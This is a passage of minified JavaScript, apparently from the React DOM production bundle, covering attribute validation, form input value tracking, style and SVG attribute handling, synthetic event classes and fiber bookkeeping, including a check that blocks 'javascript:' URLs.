Map,hoistableScripts:new Map}),t}function nt(e){e[Pa]=!0}var uo=new Set,oo={};function el(e,t){Al(e,t),Al(e+"Capture",t)}function Al(e,t){for(oo[e]=t,e=0;e<t.length;e++)uo.add(t[e])}var jh=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),ro={},fo={};function Ah(e){return gl.call(fo,e)?!0:gl.call(ro,e)?!1:jh.test(e)?fo[e]=!0:(ro[e]=!0,!1)}function pi(e,t,a){if(Ah(t))if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var l=t.toLowerCase().slice(0,5);if(l!=="data-"&&l!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+a)}}function yi(e,t,a){if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+a)}}function ca(e,t,a,l){if(l===null)e.removeAttribute(a);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(a);return}e.setAttributeNS(t,a,""+l)}}function Ht(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ho(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Eh(e,t,a){var l=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof l<"u"&&typeof l.get=="function"&&typeof l.set=="function"){var n=l.get,i=l.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return n.call(this)},set:function(c){a=""+c,i.call(this,c)}}),Object.defineProperty(e,t,{enumerable:l.enumerable}),{getValue:function(){return a},setValue:function(c){a=""+c},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Ls(e){if(!e._valueTracker){var t=ho(e)?"checked":"value";e._valueTracker=Eh(e,t,""+e[t])}}function mo(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var a=t.getValue(),l="";return e&&(l=ho(e)?e.checked?"true":"false":e.value),e=l,e!==a?(t.setValue(e),!0):!1}function gi(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var wh=/[\n"\\]/g;function Rt(e){return e.replace(wh,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function Us(e,t,a,l,n,i,c,u){e.name="",c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.type=c:e.removeAttribute("type"),t!=null?c==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+Ht(t)):e.value!==""+Ht(t)&&(e.value=""+Ht(t)):c!=="submit"&&c!=="reset"||e.removeAttribute("value"),t!=null?Bs(e,c,Ht(t)):a!=null?Bs(e,c,Ht(a)):l!=null&&e.removeAttribute("value"),n==null&&i!=null&&(e.defaultChecked=!!i),n!=null&&(e.checked=n&&typeof n!="function"&&typeof n!="symbol"),u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"?e.name=""+Ht(u):e.removeAttribute("name")}function po(e,t,a,l,n,i,c,u){if(i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"&&(e.type=i),t!=null||a!=null){if(!(i!=="submit"&&i!=="reset"||t!=null)){Ls(e);return}a=a!=null?""+Ht(a):"",t=t!=null?""+Ht(t):a,u||t===e.value||(e.value=t),e.defaultValue=t}l=l??n,l=typeof l!="function"&&typeof l!="symbol"&&!!l,e.checked=u?e.checked:!!l,e.defaultChecked=!!l,c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"&&(e.name=c),Ls(e)}function Bs(e,t,a){t==="number"&&gi(e.ownerDocument)===e||e.defaultValue===""+a||(e.defaultValue=""+a)}function El(e,t,a,l){if(e=e.options,t){t={};for(var n=0;n<a.length;n++)t["$"+a[n]]=!0;for(a=0;a<e.length;a++)n=t.hasOwnProperty("$"+e[a].value),e[a].selected!==n&&(e[a].selected=n),n&&l&&(e[a].defaultSelected=!0)}else{for(a=""+Ht(a),t=null,n=0;n<e.length;n++){if(e[n].value===a){e[n].selected=!0,l&&(e[n].defaultSelected=!0);return}t!==null||e[n].disabled||(t=e[n])}t!==null&&(t.selected=!0)}}function yo(e,t,a){if(t!=null&&(t=""+Ht(t),t!==e.value&&(e.value=t),a==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=a!=null?""+Ht(a):""}function go(e,t,a,l){if(t==null){if(l!=null){if(a!=null)throw Error(m(92));if(Ce(l)){if(1<l.length)throw Error(m(93));l=l[0]}a=l}a==null&&(a=""),t=a}a=Ht(t),e.defaultValue=a,l=e.textContent,l===a&&l!==""&&l!==null&&(e.value=l),Ls(e)}function wl(e,t){if(t){var a=e.firstChild;if(a&&a===e.lastChild&&a.nodeType===3){a.nodeValue=t;return}}e.textContent=t}var Oh=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function vo(e,t,a){var l=t.indexOf("--")===0;a==null||typeof a=="boolean"||a===""?l?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":l?e.setProperty(t,a):typeof a!="number"||a===0||Oh.has(t)?t==="float"?e.cssFloat=a:e[t]=(""+a).trim():e[t]=a+"px"}function So(e,t,a){if(t!=null&&typeof t!="object")throw Error(m(62));if(e=e.style,a!=null){for(var l in a)!a.hasOwnProperty(l)||t!=null&&t.hasOwnProperty(l)||(l.indexOf("--")===0?e.setProperty(l,""):l==="float"?e.cssFloat="":e[l]="");for(var n in t)l=t[n],t.hasOwnProperty(n)&&a[n]!==l&&vo(e,n,l)}else for(var i in t)t.hasOwnProperty(i)&&vo(e,i,t[i])}function Ys(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var zh=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),kh=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function vi(e){return kh.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function ua(){}var qs=null;function Gs(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Ol=null,zl=null;function bo(e){var t=ia(e);if(t&&(e=t.stateNode)){var a=e[de]||null;e:switch(e=t.stateNode,t.type){case"input":if(Us(e,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name),t=a.name,a.type==="radio"&&t!=null){for(a=e;a.parentNode;)a=a.parentNode;for(a=a.querySelectorAll('input[name="'+Rt(""+t)+'"][type="radio"]'),t=0;t<a.length;t++){var l=a[t];if(l!==e&&l.form===e.form){var n=l[de]||null;if(!n)throw Error(m(90));Us(l,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name)}}for(t=0;t<a.length;t++)l=a[t],l.form===e.form&&mo(l)}break e;case"textarea":yo(e,a.value,a.defaultValue);break e;case"select":t=a.value,t!=null&&El(e,!!a.multiple,t,!1)}}}var Vs=!1;function xo(e,t,a){if(Vs)return e(t,a);Vs=!0;try{var l=e(t);return l}finally{if(Vs=!1,(Ol!==null||zl!==null)&&(is(),Ol&&(t=Ol,e=zl,zl=Ol=null,bo(t),e)))for(t=0;t<e.length;t++)bo(e[t])}}function mn(e,t){var a=e.stateNode;if(a===null)return null;var l=a[de]||null;if(l===null)return null;a=l[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(l=!l.disabled)||(e=e.type,l=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!l;break e;default:e=!1}if(e)return null;if(a&&typeof a!="function")throw Error(m(231,t,typeof a));return a}var oa=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Xs=!1;if(oa)try{var pn={};Object.defineProperty(pn,"passive",{get:function(){Xs=!0}}),window.addEventListener("test",pn,pn),window.removeEventListener("test",pn,pn)}catch{Xs=!1}var Aa=null,Qs=null,Si=null;function To(){if(Si)return Si;var e,t=Qs,a=t.length,l,n="value"in Aa?Aa.value:Aa.textContent,i=n.length;for(e=0;e<a&&t[e]===n[e];e++);var c=a-e;for(l=1;l<=c&&t[a-l]===n[i-l];l++);return Si=n.slice(e,1<l?1-l:void 0)}function bi(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function xi(){return!0}function No(){return!1}function St(e){function t(a,l,n,i,c){this._reactName=a,this._targetInst=n,this.type=l,this.nativeEvent=i,this.target=c,this.currentTarget=null;for(var u in e)e.hasOwnProperty(u)&&(a=e[u],this[u]=a?a(i):i[u]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?xi:No,this.isPropagationStopped=No,this}return Q(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():typeof a.returnValue!="unknown"&&(a.returnValue=!1),this.isDefaultPrevented=xi)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():typeof a.cancelBubble!="unknown"&&(a.cancelBubble=!0),this.isPropagationStopped=xi)},persist:function(){},isPersistent:xi}),t}var tl={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ti=St(tl),yn=Q({},tl,{view:0,detail:0}),Mh=St(yn),Ks,Zs,gn,Ni=Q({},yn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Js,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==gn&&(gn&&e.type==="mousemove"?(Ks=e.screenX-gn.screenX,Zs=e.screenY-gn.screenY):Zs=Ks=0,gn=e),Ks)},movementY:function(e){return"movementY"in e?e.movementY:Zs}}),Co=St(Ni),Dh=Q({},Ni,{dataTransfer:0}),_h=St(Dh),Hh=Q({},yn,{relatedTarget:0}),Ws=St(Hh),Rh=Q({},tl,{animationName:0,elapsedTime:0,pseudoElement:0}),Lh=St(Rh),Uh=Q({},tl,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Bh=St(Uh),Yh=Q({},tl,{data:0}),jo=St(Yh),qh={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Gh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Vh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Xh(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Vh[e])?!!t[e]:!1}function Js(){return Xh}var Qh=Q({},yn,{key:function(e){if(e.key){var t=qh[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=bi(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Gh[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Js,charCode:function(e){return e.type==="keypress"?bi(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?bi(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Kh=St(Qh),Zh=Q({},Ni,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Ao=St(Zh),Wh=Q({},yn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Js}),Jh=St(Wh),Fh=Q({},tl,{propertyName:0,elapsedTime:0,pseudoElement:0}),$h=St(Fh),Ih=Q({},Ni,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Ph=St(Ih),em=Q({},tl,{newState:0,oldState:0}),tm=St(em),am=[9,13,27,32],Fs=oa&&"CompositionEvent"in window,vn=null;oa&&"documentMode"in document&&(vn=document.documentMode);var lm=oa&&"TextEvent"in window&&!vn,Eo=oa&&(!Fs||vn&&8<vn&&11>=vn),wo=" ",Oo=!1;function zo(e,t){switch(e){case"keyup":return am.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ko(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var kl=!1;function nm(e,t){switch(e){case"compositionend":return ko(t);case"keypress":return t.which!==32?null:(Oo=!0,wo);case"textInput":return e=t.data,e===wo&&Oo?null:e;default:return null}}function im(e,t){if(kl)return e==="compositionend"||!Fs&&zo(e,t)?(e=To(),Si=Qs=Aa=null,kl=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Eo&&t.locale!=="ko"?null:t.data;default:return null}}var sm={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Mo(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!sm[e.type]:t==="textarea"}function Do(e,t,a,l){Ol?zl?zl.push(l):zl=[l]:Ol=l,t=fs(t,"onChange"),0<t.length&&(a=new Ti("onChange","change",null,a,l),e.push({event:a,listeners:t}))}var Sn=null,bn=null;function cm(e){yf(e,0)}function Ci(e){var t=sa(e);if(mo(t))return e}function _o(e,t){if(e==="change")return t}var Ho=!1;if(oa){var $s;if(oa){var Is="oninput"in document;if(!Is){var Ro=document.createElement("div");Ro.setAttribute("oninput","return;"),Is=typeof Ro.oninput=="function"}$s=Is}else $s=!1;Ho=$s&&(!document.documentMode||9<document.documentMode)}function Lo(){Sn&&(Sn.detachEvent("onpropertychange",Uo),bn=Sn=null)}function Uo(e){if(e.propertyName==="value"&&Ci(bn)){var t=[];Do(t,bn,e,Gs(e)),xo(cm,t)}}function um(e,t,a){e==="focusin"?(Lo(),Sn=t,bn=a,Sn.attachEvent("onpropertychange",Uo)):e==="focusout"&&Lo()}function om(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Ci(bn)}function rm(e,t){if(e==="click")return Ci(t)}function dm(e,t){if(e==="input"||e==="change")return Ci(t)}function fm(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Et=typeof Object.is=="function"?Object.is:fm;function xn(e,t){if(Et(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var a=Object.keys(e),l=Object.keys(t);if(a.length!==l.length)return!1;for(l=0;l<a.length;l++){var n=a[l];if(!gl.call(t,n)||!Et(e[n],t[n]))return!1}return!0}function Bo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Yo(e,t){var a=Bo(e);e=0;for(var l;a;){if(a.nodeType===3){if(l=e+a.textContent.length,e<=t&&l>=t)return{node:a,offset:t-e};e=l}e:{for(;a;){if(a.nextSibling){a=a.nextSibling;break e}a=a.parentNode}a=void 0}a=Bo(a)}}function qo(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?qo(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Go(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=gi(e.document);t instanceof e.HTMLIFrameElement;){try{var a=typeof t.contentWindow.location.href=="string"}catch{a=!1}if(a)e=t.contentWindow;else break;t=gi(e.document)}return t}function Ps(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var hm=oa&&"documentMode"in document&&11>=document.documentMode,Ml=null,ec=null,Tn=null,tc=!1;function Vo(e,t,a){var l=a.window===a?a.document:a.nodeType===9?a:a.ownerDocument;tc||Ml==null||Ml!==gi(l)||(l=Ml,"selectionStart"in l&&Ps(l)?l={start:l.selectionStart,end:l.selectionEnd}:(l=(l.ownerDocument&&l.ownerDocument.defaultView||window).getSelection(),l={anchorNode:l.anchorNode,anchorOffset:l.anchorOffset,focusNode:l.focusNode,focusOffset:l.focusOffset}),Tn&&xn(Tn,l)||(Tn=l,l=fs(ec,"onSelect"),0<l.length&&(t=new Ti("onSelect","select",null,t,a),e.push({event:t,listeners:l}),t.target=Ml)))}function al(e,t){var a={};return a[e.toLowerCase()]=t.toLowerCase(),a["Webkit"+e]="webkit"+t,a["Moz"+e]="moz"+t,a}var Dl={animationend:al("Animation","AnimationEnd"),animationiteration:al("Animation","AnimationIteration"),animationstart:al("Animation","AnimationStart"),transitionrun:al("Transition","TransitionRun"),transitionstart:al("Transition","TransitionStart"),transitioncancel:al("Transition","TransitionCancel"),transitionend:al("Transition","TransitionEnd")},ac={},Xo={};oa&&(Xo=document.createElement("div").style,"AnimationEvent"in window||(delete Dl.animationend.animation,delete Dl.animationiteration.animation,delete Dl.animationstart.animation),"TransitionEvent"in window||delete Dl.transitionend.transition);function ll(e){if(ac[e])return ac[e];if(!Dl[e])return e;var t=Dl[e],a;for(a in t)if(t.hasOwnProperty(a)&&a in Xo)return ac[e]=t[a];return e}var Qo=ll("animationend"),Ko=ll("animationiteration"),Zo=ll("animationstart"),mm=ll("transitionrun"),pm=ll("transitionstart"),ym=ll("transitioncancel"),Wo=ll("transitionend"),Jo=new Map,lc="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");lc.push("scrollEnd");function Kt(e,t){Jo.set(e,t),el(t,[e])}var ji=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},Lt=[],_l=0,nc=0;function Ai(){for(var e=_l,t=nc=_l=0;t<e;){var a=Lt[t];Lt[t++]=null;var l=Lt[t];Lt[t++]=null;var n=Lt[t];Lt[t++]=null;var i=Lt[t];if(Lt[t++]=null,l!==null&&n!==null){var c=l.pending;c===null?n.next=n:(n.next=c.next,c.next=n),l.pending=n}i!==0&&Fo(a,n,i)}}function Ei(e,t,a,l){Lt[_l++]=e,Lt[_l++]=t,Lt[_l++]=a,Lt[_l++]=l,nc|=l,e.lanes|=l,e=e.alternate,e!==null&&(e.lanes|=l)}function ic(e,t,a,l){return Ei(e,t,a,l),wi(e)}function nl(e,t){return Ei(e,null,null,t),wi(e)}function Fo(e,t,a){e.lanes|=a;var l=e.alternate;l!==null&&(l.lanes|=a);for(var n=!1,i=e.return;i!==null;)i.childLanes|=a,l=i.alternate,l!==null&&(l.childLanes|=a),i.tag===22&&(e=i.stateNode,e===null||e._visibility&1||(n=!0)),e=i,i=i.return;return e.tag===3?(i=e.stateNode,n&&t!==null&&(n=31-gt(a),e=i.hiddenUpdates,l=e[n],l===null?e[n]=[t]:l.push(t),t.lane=a|536870912),i):null}function wi(e){if(50<Xn)throw Xn=0,mu=null,Error(m(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var Hl={};function gm(e,t,a,l){this.tag=e,this.key=a,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=l,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function wt(e,t,a,l){return new gm(e,t,a,l)}function sc(e){return e=e.prototype,!(!e||!e.isReactComponent)}function ra(e,t){var a=e.alternate;return a===null?(a=wt(e.tag,t,e.key,e.mode),a.elementType=e.elementType,a.type=e.type,a.stateNode=e.stateNode,a.alternate=e,e.alternate=a):(a.pendingProps=t,a.type=e.type,a.flags=0,a.subtreeFlags=0,a.deletions=null),a.flags=e.flags&65011712,a.childLanes=e.childLanes,a.lanes=e.lanes,a.child=e.child,a.memoizedProps=e.memoizedProps,a.memoizedState=e.memoizedState,a.updateQueue=e.updateQueue,t=e.dependencies,a.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},a.sibling=e.sibling,a.index=e.index,a.ref=e.ref,a.refCleanup=e.refCleanup,a}function $o(e,t){e.flags&=65011714;var a=e.alternate;return a===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=a.childLanes,e.lanes=a.lanes,e.child=a.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=a.memoizedProps,e.memoizedState=a.memoizedState,e.updateQueue=a.updateQueue,e.type=a.type,t=a.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function Oi(e,t,a,l,n,i){var c=0;if(l=e,typeof e=="function")sc(e)&&(c=1);else if(typeof e=="string")c=Tp(e,a,L.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case Ze:return e=wt(31,a,t,n),e.elementType=Ze,e.lanes=i,e;case Ve:return il(a.children,n,i,t);case mt:c=8,n|=24;break;case ve:return e=wt(12,a,t,n|2),e.elementType=ve,e.lanes=i,e;case O:return e=wt(13,a,t,n),e.elementType=O,e.lanes=i,e;case R:return e=wt(19,a,t,n),e.elementType=R,e.lanes=i,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case G:c=10;break e;case st:c=9;break e;case tt:c=11;break e;case D:c=14;break e;case _:c=16,l=null;break e}c=29,a=Error(m(130,e===null?"null":typeof e,"")),l=null}return t=wt(c,a,t,n),t.elementType=e,t.type=l,t.lanes=i,t}function il(e,t,a,l){return e=wt(7,e,l,t),e.lanes=a,e}function cc(e,t,a){return e=wt(6,e,null,t),e.lanes=a,e}function Io(e){var t=wt(18,null,null,0);return t.stateNode=e,t}function uc(e,t,a){return t=wt(4,e.children!==null?e.children:[],e.key,t),t.lanes=a,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var Po=new WeakMap;function Ut(e,t){if(typeof e=="object"&&e!==null){var a=Po.get(e);return a!==void 0?a:(t={value:e,source:t,stack:ee(t)},Po.set(e,t),t)}return{value:e,source:t,stack:ee(t)}}var Rl=[],Ll=0,zi=null,Nn=0,Bt=[],Yt=0,Ea=null,$t=1,It="";function da(e,t){Rl[Ll++]=Nn,Rl[Ll++]=zi,zi=e,Nn=t}function er(e,t,a){Bt[Yt++]=$t,Bt[Yt++]=It,Bt[Yt++]=Ea,Ea=e;var l=$t;e=It;var n=32-gt(l)-1;l&=~(1<<n),a+=1;var i=32-gt(t)+n;if(30<i){var c=n-n%5;i=(l&(1<<c)-1).toString(32),l>>=c,n-=c,$t=1<<32-gt(t)+n|a<<n|l,It=i+e}else $t=1<<i|a<<n|l,It=e}function oc(e){e.return!==null&&(da(e,1),er(e,1,0))}function rc(e){for(;e===zi;)zi=Rl[--Ll],Rl[Ll]=null,Nn=Rl[--Ll],Rl[Ll]=null;for(;e===Ea;)Ea=Bt[--Yt],Bt[Yt]=null,It=Bt[--Yt],Bt[Yt]=null,$t=Bt[--Yt],Bt[Yt]=null}function tr(e,t){Bt[Yt++]=$t,Bt[Yt++]=It,Bt[Yt++]=Ea,$t=t.id,It=t.overflow,Ea=e}var ct=null,He=null,ge=!1,wa=null,qt=!1,dc=Error(m(519));function Oa(e){var t=Error(m(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw Cn(Ut(t,e)),dc}function ar(e){var 